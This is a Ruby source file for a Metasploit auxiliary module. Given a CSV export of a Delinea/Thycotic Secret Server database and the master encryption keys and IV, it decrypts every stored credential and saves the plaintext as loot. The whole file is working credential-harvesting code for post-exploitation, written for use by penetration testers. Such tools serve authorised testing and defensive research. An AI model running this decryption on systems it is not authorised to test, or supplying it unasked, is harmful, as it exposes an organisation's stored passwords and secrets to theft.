##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Delia Thycotic Secret Server Database Offline Decrypt',
        'Description' => %q{
          This module decrypts Delia/Thycotic SecretServer credentials that have
          been previously exported. AES-128 and AES-256 Master Encryption Key
          (MEK) and associated IV values must be provided, as well as an export
          of the SecretServer database in CSV format.
        },
        'Author' => 'npm[at]cesium137.io',
        'Platform' => [ 'win' ],
        'DisclosureDate' => '2022-08-15',
        'SessionTypes' => [ 'meterpreter' ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/denandz/SecretServerSecretStealer']
        ],
        'Actions' => [
          [
            'Dump',
            {
              'Description' => 'Perform decryption of SecretServer database export file'
            }
          ]
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        }
      )
    )

    register_options([
      OptPath.new('CSVFILE', [ true, 'Path to database dump CSV file' ]),
      OptString.new('KEY', [ true, 'SecretServer 128-bit AES MEK value (hex)' ]),
      OptString.new('KEY256', [ true, 'SecretServer 256-bit AES MEK value (hex)' ]),
      OptString.new('IV', [ true, 'SecretServer MEK IV (hex)' ]),
      OptString.new('IP', [ false, '(Optional) IPv4 address to attach to loot', '127.0.0.1' ])
    ])
  end

  def csv_file
    datastore['CSVFILE']
  end

  def ss_key
    datastore['KEY'] || @ss_key
  end

  def ss_key256
    datastore['KEY256'] || @ss_key256
  end

  def ss_iv
    datastore['IV'] || @ss_iv
  end

  def loot_host
    datastore['IP'] || '127.0.0.1'
  end

  def export_header_row
    'SecretID,LastModifiedDate,Active,SecretType,SecretName,IsEncrypted,IsSalted,Use256Key,SecretFieldName,ItemKey,IvMEK,ItemValue,ItemValue2,IV'
  end

  def result_header_row
    'SecretID,LastModifiedDate,Active,SecretType,SecretName,FieldName,Plaintext,Plaintext2'
  end

  def run
    init_thycotic_encryption
    @ss_key = [ss_key].pack('H*')
    @ss_key256 = [ss_key256].pack('H*')
    @ss_iv = [ss_iv].pack('H*')
    print_status('Read database export CSV ...')
    csv = read_csv_file(csv_file)
    total_rows = csv.count
    fail_with(Msf::Exploit::Failure::NoTarget, 'No rows in import file CSV dataset') unless total_rows > 0
    print_good("#{total_rows} rows loaded, #{@ss_total_secrets} unique SecretIDs")
    result_rows = decrypt_thycotic_db(csv)
    fail_with(Msf::Exploit::Failure::NoTarget, 'Filed to decrypt CSV dataset') unless result_rows
    total_result_rows = result_rows.count - 1 # Do not count header row
    total_result_secrets = result_rows['SecretID'].uniq.count - 1
    if @ss_processed_rows == @ss_failed_rows || total_result_rows <= 0
      fail_with(Msf::Exploit::Failure::Unknown, 'No rows could be processed')
    elsif @ss_failed_rows > 0
      print_warning("#{@ss_processed_rows} rows processed (#{@ss_failed_rows} rows failed)")
    else
      print_good("#{@ss_processed_rows} rows processed")
    end
    total_records = @ss_decrypted_rows + @ss_plaintext_rows
    print_status("#{total_records} rows recovered: #{@ss_plaintext_rows} plaintext, #{@ss_decrypted_rows} decrypted (#{@ss_blank_rows} blank)")
    decrypted_data = result_rows.to_s.delete("\000")
    print_status("#{total_result_rows} rows written (#{@ss_blank_rows} blank rows withheld)")
    print_good("#{total_result_secrets} unique SecretID records recovered")
    p = store_loot('ss_dec', 'CSV', loot_host, decrypted_data, 'SecretServer.csv', 'Decrypted Database Dump')
    print_good("Decrypted Secret Server Database Dump: #{p}")
  end

  def read_csv_file(file_name)
    csv_rows = File.binread(file_name)
    csv = CSV.parse(csv_rows.gsub("\r", ''), row_sep: :auto, headers: :first_row, quote_char: "\x00", skip_blanks: true)
    unless csv
      print_error("Error importing CSV file #{csv_file}")
      raise Msf::OptionValidateError, ['CSVFILE']
    end
    @ss_total_secrets = csv['SecretID'].uniq.count
    unless @ss_total_secrets >= 1 && !csv['SecretID'].uniq.first.nil?
      print_error("Provided CSV file #{csv_file} contains no SecretID column values")
      raise Msf::OptionValidateError, ['CSVFILE']
    end
    csv
  end

  def init_thycotic_encryption
    unless ss_key.length == 32 && ss_key.match?(/^[0-9a-f]+$/i)
      print_error('Key value must be 16 byte / 32 char hexadecimal')
      raise Msf::OptionValidateError, ['KEY']
    end
    unless ss_key256.length == 64 && ss_key256.match?(/^[0-9a-f]+$/i)
      print_error('Key256 value must be 32 byte / 64 char hexadecimal')
      raise Msf::OptionValidateError, ['KEY256']
    end
    unless ss_iv.length == 32 && ss_iv.match?(/^[0-9a-f]+$/i)
      print_error('IV value must be 16 byte / 32 char hexadecimal')
      raise Msf::OptionValidateError, ['IV']
    end
    print_good('Secret Server Encryption Configuration:')
    print_good("\t   KEY: #{ss_key}")
    print_good("\tKEY256: #{ss_key256}")
    print_good("\t    IV: #{ss_iv}")
  end

  def decrypt_thycotic_db(csv_dataset)
    current_row = 0
    decrypted_rows = 0
    plaintext_rows = 0
    blank_rows = 0
    failed_rows = 0
    result_csv = CSV.parse(result_header_row, headers: result_header_row, write_headers: true, return_headers: true)
    print_status('Process Secret Server DB ...')
    csv_dataset.each do |row|
      current_row += 1
      secret_id = row['SecretID']
      if secret_id.nil?
        failed_rows += 1
        print_error("Row #{current_row} missing SecretID column, skipping")
        next
      end
      secret_ciphertext_1 = row['ItemValue']
      secret_ciphertext_2 = row['ItemValue2']
      secret_lastmod = DateTime.parse(row['LastModifiedDate']).to_time.strftime('%m/%d/%y %H:%M:%S').to_s
      secret_active = row['Active'].to_i
      secret_name = [row['SecretName'][2..]].pack('H*')
      secret_type = [row['SecretType'][2..]].pack('H*')
      secret_encrypted = row['IsEncrypted'].to_i
      secret_use256 = row['Use256Key'].to_i
      secret_keyfield_hex = row['ItemKey'][2..]
      secret_iv_hex = row['IV'][2..]
      secret_field = [row['SecretFieldName'][2..]].pack('H*')
      if secret_iv_hex == 'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF' # New-style: ItemKey and ItemIV are part of the key blob
        miv_hex = secret_keyfield_hex[4..35]
        key_hex = secret_keyfield_hex[100..]
        iv_hex = secret_ciphertext_1[4..35]
        value_1_hex = secret_ciphertext_1[100..]
      else # Old-style: ItemKey and ItemIV are stored as columns
        miv_hex = row['IvMEK'][2..]
        key_hex = secret_keyfield_hex
        iv_hex = secret_iv_hex
        value_1_hex = secret_ciphertext_1
      end
      value_1 = [value_1_hex].pack('H*')
      miv = [miv_hex].pack('H*')
      key = [key_hex].pack('H*')
      iv = [iv_hex].pack('H*')
      if secret_encrypted == 1
        secret_plaintext_1 = thycotic_secret_decrypt(secret_id: secret_id, secret_field: secret_field, secret_value: value_1, secret_key: key, secret_iv: iv, secret_miv: miv, secret_use256: secret_use256)
        if secret_plaintext_1.nil?
          vprint_warning("SecretID #{secret_id} field #{secret_field} ItemValue nil, excluding")
          blank_rows += 1
          next
        end
        # TODO: Figure out how ItemValue2 is encrypted; it does not match the structure of ItemValue.
        # For now just return ciphertext if it exists.
        secret_plaintext_2 = secret_ciphertext_2
        if !secret_plaintext_1 || !secret_plaintext_2
          print_error("SecretID #{secret_id} field #{secret_field} failed to decrypt")
          vprint_error(row.to_s)
          failed_rows += 1
          next
        end
        secret_disposition = 'decrypted'
        decrypted_rows += 1
      else
        secret_plaintext_1 = secret_ciphertext_1
        if secret_plaintext_1.nil?
          vprint_warning("SecretID #{secret_id} field #{secret_field} ItemValue nil, excluding")
          blank_rows += 1
          next
        end
        secret_plaintext_2 = secret_ciphertext_2
        secret_disposition = 'plaintext'
        plaintext_rows += 1
      end
      if !secret_plaintext_1.empty? && !secret_plaintext_2.empty?
        result_line = [secret_id.to_s, secret_lastmod.to_s, secret_active.to_s, secret_type.to_s, secret_name.to_s, secret_field.to_s, secret_plaintext_1.to_s, secret_plaintext_2.to_s]
        result_row = CSV.parse_line(CSV.generate_line(result_line).gsub("\r", ''))
        result_csv << result_row
        vprint_status("SecretID #{secret_id} field #{secret_field} ItemValue recovered: #{secret_disposition}")
      else
        vprint_warning("SecretID #{secret_id} field #{secret_field} ItemValue empty, excluding")
        blank_rows += 1
      end
    end
    @ss_processed_rows = current_row
    @ss_blank_rows = blank_rows
    @ss_decrypted_rows = decrypted_rows
    @ss_plaintext_rows = plaintext_rows
    @ss_failed_rows = failed_rows
    result_csv
  end

  def thycotic_secret_decrypt(options = {})
    secret_id = options.fetch(:secret_id)
    secret_field = options.fetch(:secret_field)
    secret_value = options.fetch(:secret_value)
    secret_key = options.fetch(:secret_key)
    secret_iv = options.fetch(:secret_iv)
    secret_miv = options.fetch(:secret_miv)
    secret_use256 = options.fetch(:secret_use256)

    if secret_use256 == 1
      mek = @ss_key256
    else
      mek = @ss_key
    end
    intermediate_key = aes_cbc_decrypt(secret_key, mek, secret_miv)
    if intermediate_key
      decrypted_secret = aes_cbc_decrypt(secret_value, intermediate_key, secret_iv)
    else
      vprint_error("SecretID #{secret_id} field #{secret_field} intermediate key decryption failed")
      decrypted_secret = false
    end
    unless decrypted_secret
      vprint_warning("SecretID #{secret_id} field #{secret_field} decryption failed via intermediate key, attempting item key decryption")
      decrypted_secret = aes_cbc_decrypt(secret_value, secret_key, secret_iv)
      return false unless decrypted_secret
    end
    plaintext = decrypted_secret.delete("\000")[4..]
    # Catch where decryption did not throw an exception but produced invalid UTF-8 plaintext
    # This was evident in a few test cases where the secret value appeared to have been pasted from Microsoft Word
    if !plaintext.force_encoding('UTF-8').valid_encoding?
      plaintext = Base64.strict_encode64(decrypted_secret.delete("\000")[4..])
      print_warning("SecretID #{secret_id} field #{secret_field} contains invalid UTF-8 and will be stored as a Base64 string in the output file")
    end
    plaintext
  end

  def aes_cbc_decrypt(ciphertext_bytes, aes_key, aes_iv)
    return false unless aes_iv.length == 16

    case aes_key.length
    when 16
      decipher = OpenSSL::Cipher.new('aes-128-cbc')
    when 32
      decipher = OpenSSL::Cipher.new('aes-256-cbc')
    else
      return false
    end
    decipher.decrypt
    decipher.key = aes_key
    decipher.iv = aes_iv
    decipher.padding = 1
    decipher.update(ciphertext_bytes) + decipher.final
  rescue OpenSSL::Cipher::CipherError
    return false
  end

end
